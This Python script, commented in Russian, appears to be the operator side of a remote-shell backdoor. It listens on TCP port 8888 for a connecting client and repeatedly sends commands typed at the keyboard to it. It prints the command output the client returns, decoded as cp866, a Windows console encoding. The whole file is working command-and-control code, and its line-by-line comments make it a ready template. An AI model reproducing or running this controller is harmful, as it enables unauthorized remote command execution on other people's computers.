import socket
import subprocess

#Создаем место для обмена данными
#SOCK_STREAM - TCP, SOCK_DGRAM - UDP, AF_INET -IPv4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#резервируем все IP на пк и порт для прослушивания и приема пакетов информации
s.bind(('0.0.0.0', 8888))
#максимум 5 подключений могут ждать в очереди беклога, пока сервер не вызовет accept()
s.listen(5)
print("Server started")
# addr - данные об отправителе, client - экземпляр класса socket
client, addr = s.accept()
#входим в цикл после подключения клиента
while True:
    #сохраняем введенную с клавиатуры команду
    command = str(input('Enter command: '))
    #отправляем клиенту введенную команду
    client.send(command.encode())
    if command == 'exit': #завершаем работу при вводе exit
        break
    # Прослушиваем и получаем данные от клиента по 4 килобайта, декодируем
    result_output = client.recv(4096).decode("cp866", errors="ignore")
    print(result_output)
#закрываем соединение с клиентом
client.close()
#закрываем соединение с сервером
s.close()
